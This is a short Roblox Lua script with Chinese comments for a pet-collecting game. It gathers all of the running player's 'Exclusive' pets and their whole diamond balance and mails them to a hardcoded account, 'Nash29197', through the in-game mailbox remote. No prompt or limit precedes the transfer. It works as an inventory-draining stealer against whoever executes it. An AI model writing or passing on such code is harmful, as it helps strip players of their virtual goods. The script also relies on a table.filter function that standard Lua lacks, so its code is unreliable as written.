-- 配置接收者帳號名稱與訊息
local MAINACCOUNT_USERNAME = "Nash29197"
local MESSAGE = "Sending Exclusive pets and diamonds!"

-- 獲取玩家數據模組
local save = require(game:GetService("ReplicatedStorage").Library.Client.Save)

-- 獲取所有 Exclusive 品質的寵物
local function GetAllExclusivePets()
    return table.filter(save.Get().Inventory.Pets, function(pet)
        return pet.rarity == "Exclusive"
    end)
end

-- 獲取鑽石數量
local function GetDiamonds()
    return save.Get().Currency.Diamonds or 0
end

-- 寄送物品（通用函數）
local function SendItem(itemType, itemId, amount)
    local sendMessage = tostring(math.random(10000, 99999)) -- 隨機訊息代號
    local args = {
        [1] = MAINACCOUNT_USERNAME, -- 接收者帳號
        [2] = sendMessage, -- 訊息
        [3] = itemType, -- 類型 ("Pets" 或 "Diamonds")
        [4] = itemId, -- 物品 ID（鑽石為 nil）
        [5] = amount -- 數量
    }
    game.ReplicatedStorage.Network["Mailbox: Send"]:InvokeServer(table.unpack(args))
    print(itemType .. " 已寄送: ID = " .. tostring(itemId) .. ", 數量 = " .. tostring(amount))
end

-- 寄送所有 Exclusive 寵物
local function SendExclusivePets()
    local exclusivePets = GetAllExclusivePets()
    if #exclusivePets > 0 then
        for _, pet in ipairs(exclusivePets) do
            SendItem("Pets", pet.id, 1)
        end
    else
        print("無 Exclusive 寵物可寄送!")
    end
end

-- 寄送鑽石
local function SendDiamonds()
    local diamonds = GetDiamonds()
    if diamonds > 0 then
        SendItem("Diamonds", nil, diamonds)
    else
        print("無鑽石可寄送!")
    end
end

-- 主執行程序
print("開始寄送 Exclusive 寵物與鑽石...")
SendExclusivePets()
SendDiamonds()
print("寄送完成！")
